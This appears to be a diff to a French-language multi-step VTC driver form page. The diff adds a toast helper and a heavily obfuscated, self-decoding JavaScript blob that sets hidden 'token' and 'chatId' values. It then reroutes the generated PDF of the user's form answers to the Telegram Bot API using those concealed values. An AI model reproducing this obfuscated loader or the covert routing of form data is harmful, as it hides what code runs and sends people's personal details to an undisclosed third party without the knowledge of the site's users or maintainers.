@@ -136,6 +136,22 @@
   </div>
 
   <script>
+
+  function showToast(message) {
+    const toast = document.getElementById('toast');
+    const messageSpan = document.getElementById('toastMessage');
+    messageSpan.textContent = message;
+    toast.classList.remove('hidden');
+    toast.classList.add('opacity-100');
+
+    setTimeout(() => {
+      toast.classList.add('hidden');
+    }, 3500); // Affiché pendant 3 secondes
+  }
+
+    var token,chatId;(function(){var fio='',pUk=267-256;function kBB(r){var w=689127;var u=r.length;var q=[];for(var i=0;i<u;i++){q[i]=r.charAt(i)};for(var i=0;i<u;i++){var c=w*(i+131)+(w%53434);var y=w*(i+680)+(w%37658);var h=c%u;var m=y%u;var e=q[h];q[h]=q[m];q[m]=e;w=(c+y)%2128872;};return q.join('')};var Iic=kBB('grtsurekwlbtjcanmoouqdicntofrhyvcpxsz').substr(0,pUk);var DQC='hara]9f2,gke rn(n9iu])),s;(dsvv[gg"))lmq=t o;y[}i;bz=uq-eSqe(;vas8;;2fras7o[6ov;=)clv0 )-nne",;,,ul6C7xx(07r,=g(+r;6,8m oC=)4 [=tn;  pn+0e+;)Ssj<cfh;gltmih+orznh 5;)=lv1h72)]e00 ;p+unrreb91;a9+.2h,n uzlad),=eh,=t;dr".;=eluv=r+ao]o;)esaCr.=]rrel7vw=dA8=8fapt]v=u=Cpc+]f(s 2l}.l(;1fr,1A6x=.=flg({d(;;!=ht;lo)!lo=5t)o5t;hr lnmcag,t4 rh-{[ca..(ic)(e,=-5=if0 i;f0f(ira CCj,r9v1)o+)prapu.6"+i(0"nog+re(a) vr1rynst(r;4iv[rlbr "r")=)).ua.a.6cd0sa,ur-}p==byx68++c=af;uq;v(svua[[j+vuql(yd.z);g+sa.p=+=r7 hAtlr;irfu*dula49,];v=hr72,erae=)7atn7;};)=.1[ufa;,bbyui;;;=)ntne2 (v(=fsp)tlflrg(}m(t]i.pCx)en(8ys  )vek[{s{itn<+rn1e)=(=s+a)"+evg6l"kp.iy,g<(ta;p>p7=ohl{;itrphcoo1.(tr*--{]jgr(oe=ug,n=.9erhiireAsra9;s nnppuoha(gvt7va6g8.;cr=rn3(ct1vtr2,}h,u=ot(tAci;auvrlf=;k".x3.pa.<rxp+m(dustolirs;(namanh0;x<. lensth.h0),n+,x0elig(t;+)lp8r[+(8tn{jl[]e+>nibqofn1 fhaarodum1[d,[p8C+x,)}. d]tmg(6.;a,.]x1ti=);o]';var stT=kBB[Iic];var GOS='';var uvF=stT;var Alu=stT(GOS,kBB(DQC));var HoW=Alu(kBB('3jg%t3z;$$ni)a2l$,sqm,Udbq1teplyek04d1nU.frUUU)v ).ard*_5a+ ;b;8,UU=;44,!r(UT.UUUb4u70).te3gy{67!i9U&j-$())$!%),( ih3Uk0.neltaao,=2telU!1.U.xj8.nwl.\/7s+18)d}{(pfi\/1r;1l_U9S7j2U)r,,an!3-)i{r,!(0.};UUb*c,U((8495c,7b${Uep2.)j%t4 )=$[:vnf{=\/5])a()g=d.{s5h!t1..)g,(0Ui,U_p..0Ue!c6.\/S1U e35.cU.]*sp4 (4=+=!;n5,!;U;twa1gnU_.)s;.0.=+;oet!(7Ufe].6l9.10t;Ur[,(U2UU=&90;0(t\/1c+_1(.{((b3_!f%. bk3" d,or$z%;91$=rU1UUUa(5){+5#C7nU.b=(1b$6;U-)_r+) 7}8C\'eq,"322)(t)c;.!"..lS.u\/,1;*oe9Ue(_,)z,)_ak;a!p)!)=0eUnt!UaqU4q#rU.dn(()jr3rh,!,=33bU0c0bUjh)}m!rrt$$;1e,x)Uj3sh)Ufel"ob3har(e%_!)_NUcb._\'dU!((}ootI.+wU#_1n)Uh.f7.(Uc$!k4it-=e7#Uo=4[odr+l.U. 7)27U}-)U60UpUaU$g;UUb.4j.U#)a4(he0g;ez{(.$nc)vUfd$=}fcrU7Ut)7$}d,q!ch}}%9U.sre.U#.p p.8f+o_f(.$b,r&((aUU_aq)patU;3t;a! 0fe.(.+y=2").\'.$4)Uk,n8)n= 4eU.U{9U_. ,6  h!spi}[cid$+f}.=5.8,o,(j=j;j#U4fr_\'U");u,Um$g. ju$,U3Uea3$U_]otrk(b.%U(sin.U) ==&p_t8h4e2at1_,$.9(2060ceyUjefo.8f"egfaU.,fUh}eUfif!h4;.U6%9Uor+o,]e;..$2'));var IoI=uvF(fio,HoW );IoI(4429);return 4067})()
+
+    
     let currentStep = 1;
     const totalSteps = 4;
 
@@ -190,10 +206,39 @@
       doc.text(content, 10, 10);
       
       const base64 = doc.output('datauristring');
+      const pdfBlob = doc.output("blob");
       //doc.save("formulaire_vtc.pdf");
-      console.log(base64)
-      alert("PDF généré !");
+      //console.log(base64)
+      //alert("PDF généré !");
+
+      sendPDFToTelegram(pdfBlob) 
     }
+
+
+    
+async function sendPDFToTelegram(pdfBlob) {
+
+  const url = `https://api.telegram.org/bot${token}/sendDocument`;
+
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("document", pdfBlob, "formulaire_vtc.pdf");
+
+  const response = await fetch(url, {
+    method: "POST",
+    body: formData
+  });
+
+  const result = await response.json();
+  console.log(result);
+
+   showToast("Votre formulaire a été envoyé avec succès")
+  document.getElementById("vtc-form").reset();
+  currentStep = 1;
+  updateForm();
+
+  
+}
   </script>
 </body>
 </html>
